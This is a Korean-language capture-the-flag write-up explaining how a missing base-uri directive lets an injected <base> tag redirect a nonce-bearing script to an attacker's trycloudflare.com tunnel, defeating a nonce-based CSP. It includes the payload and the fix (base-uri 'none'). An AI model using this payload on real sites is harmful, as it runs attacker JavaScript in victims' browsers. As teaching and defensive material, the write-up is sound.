# BABY write-up

## CSP

문제 페이지는 다음과 같은 CSP를 사용한다.

```http
Content-Security-Policy: script-src 'nonce-IO+ng4puSGHPXPNTRVhiq0zDPLE=';
```

이 정책에서는 일반적인 inline script나 nonce가 없는 script 태그는 실행되지 않는다. 그래서 단순히 다음과 같은 payload를 넣어도 막힌다.

```html
<script>alert(1)</script>
<script src="https://example.com/script.js"></script>
```

하지만 중요한 점은 `script-src`만 있고 `base-uri`가 없다는 것이다. `base-uri`가 없으면 공격자가 삽입한 `<base>` 태그로 문서의 base URL을 바꿀 수 있다.

## 핵심 아이디어

페이지 안에 이미 nonce가 붙은 script 태그가 있다고 가정한다.

```html
<script nonce="IO+ng4puSGHPXPNTRVhiq0zDPLE=" src="/script.js"></script>
```

CSP는 이 script 태그를 허용한다. 이유는 `src`의 출처 때문이 아니라, script 태그에 올바른 nonce가 붙어 있기 때문이다.

여기서 script 태그보다 앞에 다음 base 태그를 삽입한다.

```html
<base href="https://YOUR-SUBDOMAIN.trycloudflare.com/">
```

브라우저는 이후에 등장하는 상대 URL을 이 base URL 기준으로 해석한다. 따라서 원래 페이지의 `/script.js`는 다음 URL로 바뀐다.

```text
https://YOUR-SUBDOMAIN.trycloudflare.com/script.js
```

결과적으로 브라우저가 실행하는 태그는 의미상 다음과 같아진다.

```html
<script nonce="IO+ng4puSGHPXPNTRVhiq0zDPLE=" src="https://YOUR-SUBDOMAIN.trycloudflare.com/script.js"></script>
```

이 태그에는 여전히 올바른 nonce가 있으므로 CSP를 통과한다. 즉, nonce를 직접 훔치거나 새 script 태그에 붙인 것이 아니라, 기존의 nonce-bearing script 태그가 불러오는 URL만 base 태그로 바꾼 것이다.

## 성공 조건

이 방식이 성립하려면 다음 조건이 필요하다.

1. 주입한 `<base>` 태그가 nonce가 붙은 기존 script 태그보다 먼저 파싱되어야 한다.
2. CSP에 `base-uri 'none'` 또는 `base-uri 'self'`가 없어야 한다.
3. 기존 script 태그에 올바른 nonce가 붙어 있어야 한다.
4. 터널의 `/script.js`가 HTML 경고 페이지가 아니라 실제 JavaScript로 응답해야 한다.

방어하려면 CSP에 다음을 추가하면 된다.

```http
Content-Security-Policy: base-uri 'none'; script-src 'nonce-...';
```

또는 필요한 경우 `base-uri 'self'`로 제한해도 base 태그를 통한 외부 origin 변경을 막을 수 있다.
